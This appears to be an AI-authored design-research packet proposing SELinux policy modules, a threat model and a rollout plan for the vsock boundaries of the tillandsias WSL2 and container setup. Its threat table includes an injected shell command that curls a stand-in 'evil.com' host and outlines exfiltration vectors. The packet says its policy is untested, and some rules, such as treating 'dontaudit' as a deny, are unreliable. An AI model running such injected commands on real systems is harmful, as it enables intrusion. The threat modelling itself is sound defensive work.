# SELinux Zero-Trust vsock Policy Design
# Research Packet — 2026-06-29

**Status**: design-research (not yet implemented)
**Scope**: All three vsock communication boundaries in the tillandsias multi-host architecture
**Author**: claude-opus (research fork)
**References**:
- `openspec/specs/vsock-transport/spec.md`
- `openspec/changes/control-wire-pty-attach/specs/vsock-transport/spec.md`
- `crates/tillandsias-windows-tray/src/wsl_lifecycle.rs` (systemd unit injection)
- `crates/tillandsias-headless/src/vault_bootstrap.rs` (Vault container launch)

---

## Executive Summary

Tillandsias currently has **zero SELinux enforcement** on its three vsock communication
boundaries. The most critical gap is `--security-opt label=disable` on the Vault container
(line 1440, `vault_bootstrap.rs`), which completely disables MAC for the process storing
all secrets. The systemd service for `tillandsias-headless` has no `SELinuxContext=`
directive and thus runs confined only by whatever permissive/unconfined policy the Fedora 44
WSL2 image ships with.

This document provides the threat model, concrete SELinux `.te` policy modules, WSL2
enablement guide, and a prioritized implementation roadmap to reach Zero-Trust at every
boundary.

---

## Architecture Under Analysis

```
Windows host
  │
  │ AF_HYPERV (HvSocket) ── port 42420
  ▼
Fedora 44 WSL2 guest
  tillandsias-headless (binds AF_VSOCK VMADDR_CID_ANY:42420)
  │
  ├──► Vault container        (currently: -p 127.0.0.1:8201:8200, label=disable)
  ├──► git-mirror container   (currently: podman network alias + bridge TCP)
  ├──► forge-<proj> container (currently: podman exec -it)
  └──► inference container    (currently: bridge TCP)

Future (vsock-in-vsock):
  tillandsias-headless ──► AF_VSOCK CID_HOST (CID 2 from container POV)
    vault container:       listens on vsock port 42430
    git-mirror container:  listens on vsock port 42431
    forge-* containers:    listen on vsock ports 42440–42499
    inference container:   listens on vsock port 42450
```

---

## 1. SELinux and AF_VSOCK: Kernel Support Facts

### Object Class

SELinux treats `AF_VSOCK` sockets as the `vsock_socket` object class. This was introduced
alongside the `vsock_socket` class definition in the SELinux reference policy and supported
at the kernel level through the `security_socket_create`, `security_socket_bind`,
`security_socket_listen`, `security_socket_accept`, and `security_socket_connect` LSM hooks.

The full permission set for `vsock_socket`:
```
class vsock_socket {
    accept bind connect create getattr getopt ioctl listen
    name_bind read recv_msg send_msg setattr setopt shutdown write
}
```

**Critical difference from TCP/UDP**: vsock ports are NOT labeled via `semanage port`.
The socket inherits the label of the creating process. There is no `vsock_port_t` type
in standard SELinux policy. Port-level access control must be enforced via socket peer
labels and `connectto` / `accept` permission checks on the socket object.

### How vsock Accept Checks Work

When `tillandsias-headless` (domain `tillandsias_headless_t`) calls `accept()` on its
bound vsock socket, SELinux checks:

```
allow tillandsias_headless_t <peer_socket_label>:vsock_socket accept;
```

For connections arriving from the Windows host via HvSocket → AF_VSOCK bridge, the
peer label is assigned by the kernel's vsock implementation. On a standard Linux kernel,
vsock connections from the Hyper-V host side arrive labeled as the kernel's own socket
(`kernel_t`). This means the allow rule must permit `kernel_t:vsock_socket accept`.

For connections from containers (CID 2 = the Fedora 44 host from their perspective),
the peer label is the socket label of the container's connecting process — e.g.
`vault_container_t:vsock_socket connectto` from the Vault container.

### WSL2 SELinux Status

WSL2 kernels include `CONFIG_SECURITY_SELINUX=y` as of at least kernel 5.15. The
Microsoft-modified WSL2 kernel does NOT enforce a security boot parameter of `selinux=0`
by default, but the Fedora 44 **Container Base OCI image** (not the full Fedora workstation
or server image) ships without SELinux policy files preloaded and typically boots with
SELinux in `Disabled` mode.

Verification commands:
```bash
# From Windows host:
wsl -d tillandsias -u root -- getenforce
# Expected output: "Disabled" or "Permissive" on a fresh Container Base import

wsl -d tillandsias -u root -- cat /sys/fs/selinux/enforce
# 0 = permissive, 1 = enforcing, file absent = disabled

wsl -d tillandsias -u root -- sestatus
# Shows policy name, mode, and which subsystems are enforcing
```

The Fedora Container Base does ship `selinux-policy-targeted` but it may not be installed
in the OCI layer. The `ensure_base_packages` function in `wsl_lifecycle.rs` currently
installs `systemd podman dbus-broker libcap shadow-utils openssl` but NOT
`selinux-policy-targeted policycoreutils selinux-policy-devel`.

---

## 2. Threat Model

### Boundary 1: HvSocket (Windows host → Fedora 44)

| Threat | Attack vector | Current mitigation | Missing control |
|--------|--------------|-------------------|----------------|
| Rogue Windows process impersonates tray | Any Windows process connects to the HvSocket VM GUID + service GUID | Windows DACL on the VM GUID limits who can create HvSocket connections to the VM | No application-layer authentication of the connecting client; any local user with Hyper-V access can connect |
| Malicious `PtyOpen` injection | Crafted `PtyOpen { argv: ["/bin/sh", "-c", "curl evil.com"] }` | Wire framing validates envelope structure; headless validates `Hello` capabilities | No SELinux restriction on what `tillandsias-headless` can execute as a child process; no argv allowlist |
| Protocol downgrade | Connecting client sends WIRE_VERSION=0 | `HelloAck` version mismatch aborts connection | No SELinux control; the code path handles this but there's no policy enforcement |
| Pivot from headless to VM internals | Headless is compromised; attacker uses its privileges to escape | Headless runs as root (UID 0, `HOME=/root` in service unit) — gives full VM access if compromised | Headless runs as root with no capability drops in the systemd unit; SELinux domain confinement could restrict blast radius |

**Key gap**: `tillandsias-headless.service` runs as root with no capability restrictions
and no `SELinuxContext=` in the unit. A compromised headless has full root access to the
Fedora 44 VM. This is the highest-severity gap on Boundary 1.

### Boundary 2: Container → Fedora 44 headless (future vsock-in-vsock)

| Threat | Attack vector | Current mitigation | Missing control |
|--------|--------------|-------------------|----------------|
| Compromised forge container connects to Vault port | Forge's vsock listener process connects to port 42430 | None — no vsock from containers yet; TCP network is isolated per enclave bridge | Port 42420 (control wire) must be blocked to all containers; SELinux deny |
| Cross-container vsock intercept | git-mirror container connects to forge's vsock port | Separate ports per container type | SELinux `connectto` must restrict which domain can connect to which domain's socket |
| Container escapes Fedora 44 via vsock to Windows host | Container connects on vsock CID 2 port 42420 | Port 42420 is the host control port, not a container service port | Headless must reject connections from container CIDs on control port; SELinux can enforce this at domain level |
| Denial-of-service via vsock flooding | Container floods headless vsock port with connections | None | Rate limiting in headless; SELinux alone cannot mitigate |

### Boundary 3: Within Containers

| Threat | Attack vector | Current mitigation | Missing control |
|--------|--------------|-------------------|----------------|
| Rogue subprocess in forge opens vsock listener | Agent code creates vsock server exfiltrating data | No restriction | SELinux `vsock_socket { bind listen }` should be restricted to the forge service process domain, not the agent subprocess domain |
| API key exfiltration via vsock | Agent reads `ANTHROPIC_API_KEY` from env and sends via vsock | `--security-opt no-new-privileges` prevents SUID abuse; key is in env, not socket | SELinux does not restrict which processes can read env vars; the fix is not passing keys as env vars (use Vault + AppRole) |
| Container-to-container lateral movement via vsock | Compromised forge connects to git-mirror's vsock port | Different vsock ports per service | SELinux `vsock_socket connectto` can restrict forge_container_t from connecting to git_mirror's domain socket |

---

## 3. Current Design Gaps

### Gap 1: `--security-opt label=disable` on Vault (CRITICAL)

**Location**: `crates/tillandsias-headless/src/vault_bootstrap.rs:1440`

```rust
"--security-opt",
"label=disable",
```

This disables all SELinux MAC enforcement for the Vault container — the process that holds
ALL secrets (unseal key, root token, GitHub token, provider API keys). A compromised Vault
container process has no SELinux constraint.

**Why it was used**: Rootless podman with `--userns keep-id` and a named volume maps the
host user's UID into the container. The Vault image uses a non-root `vault` user. Without
a custom `vault_container_t` policy that matches this UID mapping and grants file access
with the correct SELinux file context (`fcontext`), the standard podman container policy
blocks access to the volume, and the `vault` process fails to start.

**Correct fix**: See Section 5 for the `vault_container_t` domain definition and
`fcontext` labeling. The `:U` volume flag (already present) handles ownership; a custom
`fcontext` rule handles the SELinux label on the volume directory.

### Gap 2: `tillandsias-headless.service` runs as root with no SELinux domain

**Location**: `crates/tillandsias-windows-tray/src/wsl_lifecycle.rs:353–373` (injected unit)

The service unit has no:
- `User=` or `DynamicUser=yes` (runs as root)
- `CapabilityBoundingSet=` (has all capabilities)
- `SELinuxContext=` (runs in inherited domain, likely `init_t` or `unconfined_t`)
- `NoNewPrivileges=yes`

A custom SELinux module with domain transition on exec (`tillandsias_headless_exec_t →
tillandsias_headless_t`) would confine the headless to only what it needs.

### Gap 3: No `selinux-policy-targeted` in `ensure_base_packages`

**Location**: `crates/tillandsias-windows-tray/src/wsl_lifecycle.rs:268–274`

Current install: `systemd podman dbus-broker libcap shadow-utils openssl`

Missing: `selinux-policy-targeted policycoreutils selinux-policy-devel checkpolicy`

Without these packages, SELinux is permanently disabled in the Fedora 44 WSL2 instance.

### Gap 4: Port publish exposes Vault over loopback TCP

**Location**: `vault_bootstrap.rs:1443–1444`

```rust
"-p",
&port_arg,  // "127.0.0.1:8201:8200"
```

The loopback TCP port is accessible to any process on the Fedora 44 VM (or any container
in the `enclave` bridge network that has a route to the Fedora 44 host loopback). The
vsock replacement eliminates this exposure entirely.

---

## 4. SELinux Policy Modules

### Policy Module: `tillandsias_headless.te`

This module confines `tillandsias-headless` to the minimum privileges needed to:
- Bind AF_VSOCK port 42420 and accept connections
- In future: bind per-container service ports (42430–42499)
- Manage podman via the rootless podman socket
- Read/write its own log directory and config files
- NOT: bind TCP ports, access user home directories, use setuid, load kernel modules

```te
policy_module(tillandsias_headless, 1.0)

########################################
# Types
########################################

type tillandsias_headless_t;
type tillandsias_headless_exec_t;

# Domain transition: when systemd starts the binary at tillandsias_headless_exec_t path,
# the process transitions to tillandsias_headless_t domain.
init_daemon_domain(tillandsias_headless_t, tillandsias_headless_exec_t)

# File contexts for the headless binary and data directories
type tillandsias_headless_var_t;     # /var/lib/tillandsias/ state
type tillandsias_headless_run_t;     # /run/tillandsias/ runtime state
type tillandsias_headless_log_t;     # /var/log/tillandsias/ or journald

########################################
# Boundary 1: Host → Guest vsock (port 42420)
########################################

# Bind and listen on vsock port 42420 (the control wire).
# self:vsock_socket { create } is needed first, then bind → listen → accept → read/write.
allow tillandsias_headless_t self:vsock_socket {
    create setopt getopt getattr bind listen accept read write recv_msg send_msg shutdown
};

# The vsock connection from the Windows host arrives labeled as kernel_t because
# HvSocket connections come through the kernel's vsock-over-Hyper-V path.
# Adjust if audit logs show a different peer label on your kernel.
allow tillandsias_headless_t kernel_t:vsock_socket accept;

# Per-container service ports (future Boundary 2 listener ports):
# The headless binds these to receive connections from containers.
# These are on the same vsock socket class; port separation is by the listen/accept
# flow, not by a separate socket label.
# When the container-vsock feature is enabled, add the same allow rules for
# the container socket domains (vault_container_t, forge_container_t, etc.).

########################################
# Deny ALL other domains from binding port 42420
########################################

# neverallow is a compile-time check. At runtime, AVC denials enforce this.
# This neverallow prevents ANY policy module from accidentally granting another
# domain the ability to bind vsock in a way that could intercept port 42420.
# Note: we can't neverallow "bind on a specific vsock port number" in standard SELinux
# because vsock port binding is not tracked via port_t labels.
# The enforcement is: ONLY tillandsias_headless_t gets { bind listen accept } on vsock_socket.
neverallow { domain -tillandsias_headless_t -kernel_t -init_t } self:vsock_socket { bind listen };

########################################
# Podman access (to manage containers)
########################################

# The headless runs as root in the VM and invokes podman via the root podman socket.
# In rootless mode this is /run/user/0/podman/podman.sock (XDG_RUNTIME_DIR=/run/user/0).
# Allow unix socket connection to podman's socket.
allow tillandsias_headless_t tillandsias_headless_run_t:sock_file write;
# Allow exec of podman binary
can_exec(tillandsias_headless_t, bin_t)

########################################
# File system access
########################################

# Read the headless binary itself (already covered by exec transition, but for mmap)
allow tillandsias_headless_t tillandsias_headless_exec_t:file { read execute map };

# Read/write own state directory (/var/lib/tillandsias/ or /run/tillandsias/)
allow tillandsias_headless_t tillandsias_headless_var_t:dir { read write search add_name remove_name };
allow tillandsias_headless_t tillandsias_headless_var_t:file { read write create unlink rename };

# Write to journal (standard output → journald)
logging_send_syslog_msg(tillandsias_headless_t)

########################################
# Deny sensitive capabilities the headless does NOT need
########################################

# The headless should NOT have network capability to open arbitrary TCP sockets
# to the outside world. It only needs vsock. But Linux has no "only vsock" capability —
# capability restrictions apply to raw sockets, not AF_VSOCK. So we deny the
# capabilities that would allow escape:
dontaudit tillandsias_headless_t self:capability { sys_admin sys_ptrace sys_boot };
```

### File Context: `tillandsias_headless.fc`

```fc
# Binary exec path — triggers domain transition
/usr/local/bin/tillandsias-headless  -- gen_context(system_u:object_r:tillandsias_headless_exec_t, s0)

# State directory
/var/lib/tillandsias(/.*)?           gen_context(system_u:object_r:tillandsias_headless_var_t, s0)

# Runtime directory
/run/tillandsias(/.*)?               gen_context(system_u:object_r:tillandsias_headless_run_t, s0)
```

### Interface File: `tillandsias_headless.if`

```if
## <summary>Allow other modules to interact with tillandsias-headless domains</summary>

########################################
## <summary>Connect to the headless vsock service port (Boundary 2)</summary>
## <param name="domain">The container domain that will connect</param>
#
interface(`tillandsias_headless_vsock_connect',`
    gen_require(`
        type tillandsias_headless_t;
    ')
    allow $1 self:vsock_socket { create setopt connect read write recv_msg send_msg shutdown getattr getopt };
    allow $1 tillandsias_headless_t:vsock_socket connectto;
')
```

---

### Policy Module: `tillandsias_vault.te`

```te
policy_module(tillandsias_vault, 1.0)

########################################
# Types
########################################

type vault_container_t;
type vault_container_exec_t;

# Vault is started by podman from the headless's context.
# Type transition when headless executes the vault binary in the container:
type_transition tillandsias_headless_t vault_container_exec_t:process vault_container_t;

########################################
# Vault serves via vsock (future) — it does NOT connect outbound to vsock
########################################

# Vault listens on vsock port 42430 (future: when vsock replaces TCP port publish)
allow vault_container_t self:vsock_socket {
    create setopt getopt getattr bind listen accept read write recv_msg send_msg shutdown
};

# Vault does NOT get to connect outbound to any vsock port (especially not 42420)
# The neverallow at compile time:
neverallow vault_container_t { tillandsias_headless_t domain }:vsock_socket connectto;

########################################
# Vault file system access (the data volume)
########################################

type vault_data_t;  # Type for /var/lib/tillandsias/vault-data/ (the named volume)

allow vault_container_t vault_data_t:dir { read write search add_name remove_name };
allow vault_container_t vault_data_t:file { read write create unlink rename lock };

# The tmpfs handover directory
allow vault_container_t tmpfs_t:dir { read write search };
allow vault_container_t tmpfs_t:file { read write create unlink };

########################################
# Capabilities (matching current --cap-drop ALL --cap-add IPC_LOCK)
########################################

allow vault_container_t self:capability { ipc_lock };
# Deny everything else:
dontaudit vault_container_t self:capability { sys_admin sys_ptrace net_admin net_raw setuid setgid };
neverallow vault_container_t self:capability sys_admin;

########################################
# Deny vsock connect to host control port
########################################

# Vault must NOT be able to connect to port 42420 (the host control wire).
# Enforced by: vault_container_t does not have { connect connectto } permission
# on tillandsias_headless_t:vsock_socket.
# (The neverallow above already covers this for all container domains.)
```

### File Context: `tillandsias_vault.fc`

```fc
# Vault data volume directory in host rootfs
/var/lib/tillandsias/vault-data(/.*)?  gen_context(system_u:object_r:vault_data_t, s0)
```

---

### Policy Module: `tillandsias_forge.te`

```te
policy_module(tillandsias_forge, 1.0)

type forge_container_t;
type forge_container_exec_t;

# Forge containers handle the coding agent (Claude Code, Codex, OpenCode).
# They connect OUTBOUND to the headless on their designated vsock port range (42440–42499).
# They do NOT bind/listen for vsock (the PTY session is host-initiated).

# Use the tillandsias_headless.if interface to grant vsock connect permission:
tillandsias_headless_vsock_connect(forge_container_t)

# Forge can read/write its workspace (git checkout)
type forge_workspace_t;
allow forge_container_t forge_workspace_t:dir { read write search add_name remove_name };
allow forge_container_t forge_workspace_t:file { read write create unlink rename };

# Forge must NOT be able to bind vsock (only connect)
neverallow forge_container_t self:vsock_socket { bind listen };

# Forge must NOT be able to connect to vault's vsock port (42430)
# Enforced by: forge_container_t's vsock connect goes to tillandsias_headless_t only,
# not to vault_container_t or git_mirror_container_t.
neverallow forge_container_t vault_container_t:vsock_socket connectto;
neverallow forge_container_t git_mirror_container_t:vsock_socket connectto;
```

---

### Policy Module: `tillandsias_git_mirror.te`

```te
policy_module(tillandsias_git_mirror, 1.0)

type git_mirror_container_t;
type git_mirror_container_exec_t;

# git-mirror connects inbound to clients (it's a git smart-HTTP server).
# It does NOT initiate vsock connections to the headless for data traffic.
# It MAY have a vsock connection for health/status reporting to the headless.

# Future: git-mirror listens on vsock port 42431 for repo-fetch requests
allow git_mirror_container_t self:vsock_socket {
    create setopt getopt getattr bind listen accept read write recv_msg send_msg shutdown
};

# No outbound vsock connection to host control port:
neverallow git_mirror_container_t tillandsias_headless_t:vsock_socket connectto;
```

---

### Policy Module: `tillandsias_inference.te`

```te
policy_module(tillandsias_inference, 1.0)

type inference_container_t;
type inference_container_exec_t;

# inference (Ollama) serves model inference requests.
# It listens on vsock port 42450 (future; currently TCP bridge).
allow inference_container_t self:vsock_socket {
    create setopt getopt getattr bind listen accept read write recv_msg send_msg shutdown
};

# inference must NOT connect outbound to the headless control port:
neverallow inference_container_t tillandsias_headless_t:vsock_socket connectto;

# But the forge container IS allowed to connect to the inference vsock port:
# (This is expressed in the forge module's tillandsias_headless_vsock_connect or
# a new interface in tillandsias_inference.if)
```

---

## 5. Fixing `--security-opt label=disable` on Vault

### Root Cause

The Vault container uses `--userns keep-id` (maps host UID → container UID) and a named
volume mounted at `/vault/data:U` (`:U` = chown to mapped UID). The container process
runs as the `vault` user. Without a custom SELinux file context for the Vault data
directory, podman's standard container policy assigns the volume files `svirt_sandbox_file_t`
with an MCS label. When `--userns keep-id` remaps the UID, podman's automatic MCS label
assignment can disagree with the file's existing label, causing AVC denials on file access
— the path of least resistance was `label=disable`.

### Correct Fix

**Step 1**: Add the `vault_data_t` file context for the volume directory (in `tillandsias_vault.fc`).
After installing the policy module, run:
```bash
# In the Fedora 44 VM as root:
semanage fcontext -a -t vault_data_t "/var/lib/tillandsias/vault-data(/.*)?"
restorecon -Rv /var/lib/tillandsias/vault-data/
```

**Step 2**: Replace `--security-opt label=disable` with an explicit container label:
```rust
// In vault_bootstrap.rs, replace:
"--security-opt",
"label=disable",

// With:
"--security-opt",
"label=type:vault_container_t",
// And if MCS is needed (for multi-instance isolation):
"--security-opt",
"label=level:s0:c100,c200",
```

**Step 3**: Ensure the Vault binary in the image has the exec transition label set.
In the `images/vault/Containerfile`:
```dockerfile
# Set the SELinux exec label so the domain transition fires
RUN chcon -t vault_container_exec_t /usr/local/bin/vault || true
```
(The `|| true` makes it safe on build systems without SELinux; the fcontext rule handles production.)

**Step 4**: The `--userns keep-id` interaction. With `vault_container_t` domain and
proper file contexts, the volume access succeeds because:
- `allow vault_container_t vault_data_t:file { read write create ... }` is granted
- The MCS level is consistent because we set it explicitly with `label=level:`
- The `:U` flag still handles the POSIX ownership (UID mapping) correctly

---

## 6. SELinux in WSL2: Practical Enablement Guide

### Step 1: Install the SELinux stack

Add to the `ensure_base_packages` script in `wsl_lifecycle.rs`:

```bash
rpm -q selinux-policy-targeted policycoreutils selinux-policy-devel \
    checkpolicy setools-console libsemanage python3-policycoreutils \
    >/dev/null 2>&1 || \
    dnf install -y selinux-policy-targeted policycoreutils \
        selinux-policy-devel checkpolicy setools-console \
        libsemanage python3-policycoreutils
```

### Step 2: Enable SELinux kernel parameter for WSL2

WSL2 uses `/etc/wsl.conf` for some settings but the SELinux kernel command line parameter
is set in Windows via `%USERPROFILE%\.wslconfig` or the distro's `wsl.conf`:

In the injected `/etc/wsl.conf` (add to `configure_recipe_distro`):
```ini
[boot]
command = setenforce 1
```

However, for the kernel to initialize SELinux at all, `selinux=1` must be in the
kernel command line. WSL2 kernels support `BOOT_PARAMETERS` via `.wslconfig`:

```ini
# %USERPROFILE%\.wslconfig  (Windows host)
[wsl2]
kernelCommandLine = selinux=1 enforcing=0
```

`enforcing=0` starts in permissive mode for safety; `wsl.conf [boot] command` then
calls `setenforce 1` after policy is loaded.

### Step 3: Run the relabeling pass

After installing the policy and setting SELinux enabled, a full filesystem relabel is
needed. The WSL2 startup is fast enough that an offline relabel is practical:

```bash
# As root in the Fedora 44 distro (first boot with SELinux enabled):
restorecon -Rv /usr/local/bin/tillandsias-headless
restorecon -Rv /etc/systemd/system/tillandsias-headless*.service
restorecon -Rv /usr/local/lib/tillandsias/
restorecon -Rv /var/lib/tillandsias/
# Full relabel for the system (slow, do once):
touch /.autorelabel
# Or: fixfiles -F onboot
```

### Step 4: Load the tillandsias policy modules

```bash
# In the Fedora 44 distro build/installation step:
make -f /usr/share/selinux/devel/Makefile tillandsias_headless.pp
make -f /usr/share/selinux/devel/Makefile tillandsias_vault.pp
make -f /usr/share/selinux/devel/Makefile tillandsias_forge.pp
semodule -i tillandsias_headless.pp tillandsias_vault.pp tillandsias_forge.pp
```

The `inject_bootstrap_logic` function should be extended to write these `.pp` files to
the VM and run `semodule -i` as part of provisioning. They should live in
`/usr/local/lib/tillandsias/selinux/`.

### Step 5: Transition to enforcing (domain-by-domain)

Use permissive domains to enforce only the headless first, while keeping everything else
in permissive mode. This lets you tune the policy without breaking the system:

```bash
# Put the headless domain in enforcing while the rest stays permissive:
semanage permissive -d tillandsias_headless_t  # Remove from permissive → becomes enforcing
# (Everything else remains in the global permissive mode until you flip setenforce 1)

# Check for AVC denials without enforcement:
setenforce 0
systemctl restart tillandsias-headless
ausearch -m avc -c tillandsias-hea --start recent
# Tune the policy based on denials, then:
setenforce 1
```

### Step 6: Audit monitoring

Add the following to the injected `tillandsias-headless.service` unit:

```ini
[Service]
# ... existing config ...
# Log AVC denials to the journal for the headless process
ExecStartPost=-/usr/sbin/auditctl -a always,exit -F arch=b64 \
    -S socket -F a0=40 -k vsock_headless
```

`a0=40` is `AF_VSOCK` (decimal). This logs all vsock socket syscalls during development.

---

## 7. Zero-Trust Implementation Checklist

### Priority 1 (P0 — immediate, unblocks vsock correctness)

- [ ] **Add SELinux packages to `ensure_base_packages`**: `selinux-policy-targeted policycoreutils selinux-policy-devel`
- [ ] **Add `selinux=1 enforcing=0` to `.wslconfig` kernelCommandLine** via the Windows provisioning flow
- [ ] **Remove `--security-opt label=disable` from Vault** and replace with `--security-opt label=type:vault_container_t`
- [ ] **Add `NoNewPrivileges=yes` to `tillandsias-headless.service`** (the systemd unit injected by `inject_bootstrap_logic`)

### Priority 2 (P1 — before vsock-in-vsock feature ships)

- [ ] **Write and ship the `tillandsias_headless.te` / `.fc` / `.if` policy module** via `inject_bootstrap_logic`
- [ ] **Write and ship `tillandsias_vault.te` / `.fc`** with `vault_data_t` file context
- [ ] **`semodule -i` in the provisioning sequence** after systemd units are installed
- [ ] **Relabeling pass** (`restorecon -Rv`) for headless binary and data directories
- [ ] **Transition `tillandsias-headless.service` to domain `tillandsias_headless_t`** via exec label on binary
- [ ] **Block port 42420 from container vsock access** via `neverallow` in the headless module

### Priority 3 (P2 — when vsock-in-vsock is implemented)

- [ ] **Write `tillandsias_forge.te`, `tillandsias_git_mirror.te`, `tillandsias_inference.te`**
- [ ] **Add `--device /dev/vsock` to container launch args** (headless-side code)
- [ ] **Add per-container vsock listeners** in each container image (small Rust binary or socat)
- [ ] **Remove TCP port publishes** for all containers (Vault's `-p 127.0.0.1:8201:8200` and enclave bridge)
- [ ] **MCS label enforcement** — assign unique s0:c{x},c{y} labels per container instance
- [ ] **Enable SELinux enforcing** globally (`setenforce 1`)
- [ ] **Audit log review** — clean AVC denials for one full provisioning cycle + agent session

### Priority 4 (P3 — hardening)

- [ ] **Add SELinux `User=` to headless service** — run as a dedicated non-root user with restricted capabilities
- [ ] **`CapabilityBoundingSet=` in headless service** — drop all non-essential capabilities
- [ ] **Policy audit with `seinfo` and `sesearch`** — verify neverallow constraints hold
- [ ] **CI integration** — run `checkpolicy -M -c 33` on the `.te` files in CI
- [ ] **selinux=1 enforcing=1 from first boot** (not just after policy installation)

---

## 8. Key Invariants to Enforce

| Invariant ID | Expression | Current status | Enforcement mechanism |
|-------------|-----------|----------------|----------------------|
| `selinux.invariant.headless-domain-isolated` | `tillandsias-headless binary EXECUTES IN tillandsias_headless_t domain` | VIOLATED (runs unconfined) | `tillandsias_headless.fc` + `semodule -i` |
| `selinux.invariant.vault-label-not-disabled` | `vault container launch DOES NOT use --security-opt label=disable` | VIOLATED (label=disable at line 1440) | Remove `label=disable`, add `label=type:vault_container_t` |
| `selinux.invariant.vsock-42420-headless-only` | `bind on vsock port 42420 IS RESTRICTED TO tillandsias_headless_t` | NOT ENFORCED (no SELinux) | `neverallow` in `tillandsias_headless.te` |
| `selinux.invariant.container-cannot-reach-42420` | `container domains CANNOT connectto tillandsias_headless_t:vsock_socket` | NOT ENFORCED | `neverallow` + domain separation |
| `vsock-transport.invariant.no-tokens-in-messages` | No token fields in `ControlMessage` | ENFORCED by code | Policy invariant (`neverallow` for token-reading domains) |
| `selinux.invariant.no-label-disable-on-any-container` | No container uses `--security-opt label=disable` | VIOLATED (Vault) | Policy enforcement in Rust code (search for `label=disable`) |

---

## 9. Open Questions / Research Items

1. **What label does the WSL2 kernel assign to incoming HvSocket connections on the AF_VSOCK side?**
   Run with permissive mode and check: `ausearch -m avc -c "tillandsias-hea" | grep vsock_socket`
   Expected: `scontext=system_u:system_r:kernel_t:s0` for the peer on the accept AVC log.

2. **Does the Microsoft WSL2 kernel build include `CONFIG_SECURITY_SELINUX_BOOTPARAM=y`?**
   Check: `cat /proc/config.gz | gunzip | grep SELINUX` inside the WSL2 instance.
   If `CONFIG_SECURITY_SELINUX_BOOTPARAM` is not set, `selinux=1` in the kernel command
   line is not effective and the kernel must be rebuilt — a blocker.

3. **Is `AF_VSOCK` in a podman container network namespace forwarded to CID 2 (Fedora 44 host)?**
   Test: `strace -e socket podman run --rm --device /dev/vsock fedora:44 /bin/sh -c
   "python3 -c 'import socket; s=socket.socket(socket.AF_VSOCK); s.connect((2,42420))'"
   This would confirm whether containers can reach the headless on CID 2 before we build
   the vsock-in-vsock infrastructure.

4. **Can `semanage permissive -a tillandsias_headless_t` operate before `semodule -i`?**
   No — the type must exist in the policy before it can be placed in permissive list.
   Order: `semodule -i` → `semanage permissive -a` → test → `semanage permissive -d` → enforcing.

5. **Is `--userns keep-id` compatible with `label=type:vault_container_t`?**
   Podman supports both flags together. The MCS label assigned with `label=level:s0:c100,c200`
   is independent of the UID mapping. The test is: does the Vault process (as the mapped UID)
   have `vault_container_t:s0:c100,c200` context? Verify with `ps -Z` inside the container.

---

## 10. Files to Create/Modify for Implementation

| File | Action | Description |
|------|--------|-------------|
| `images/selinux/tillandsias_headless.te` | CREATE | Headless domain policy |
| `images/selinux/tillandsias_headless.fc` | CREATE | Headless file contexts |
| `images/selinux/tillandsias_headless.if` | CREATE | Headless interface definitions |
| `images/selinux/tillandsias_vault.te` | CREATE | Vault container policy |
| `images/selinux/tillandsias_vault.fc` | CREATE | Vault file contexts |
| `images/selinux/tillandsias_forge.te` | CREATE | Forge container policy |
| `images/selinux/tillandsias_git_mirror.te` | CREATE | git-mirror container policy |
| `images/selinux/tillandsias_inference.te` | CREATE | inference container policy |
| `images/selinux/Makefile` | CREATE | `make -f /usr/share/selinux/devel/Makefile *.pp` |
| `crates/tillandsias-windows-tray/src/wsl_lifecycle.rs` | MODIFY | Add SELinux packages to `ensure_base_packages`; add `semodule -i` step to `inject_bootstrap_logic`; add `NoNewPrivileges=yes` to headless service unit |
| `crates/tillandsias-headless/src/vault_bootstrap.rs` | MODIFY | Replace `label=disable` with `label=type:vault_container_t`; add `semanage fcontext` for vault data volume |
| `openspec/specs/vsock-transport/spec.md` | MODIFY | Add SELinux enforcement requirements as new invariants |

---

*End of research packet. This document describes the intended design; none of the SELinux
modules have been compiled or tested. The P0 items (packages + `label=disable` removal)
can be implemented independently of the vsock-in-vsock feature.*
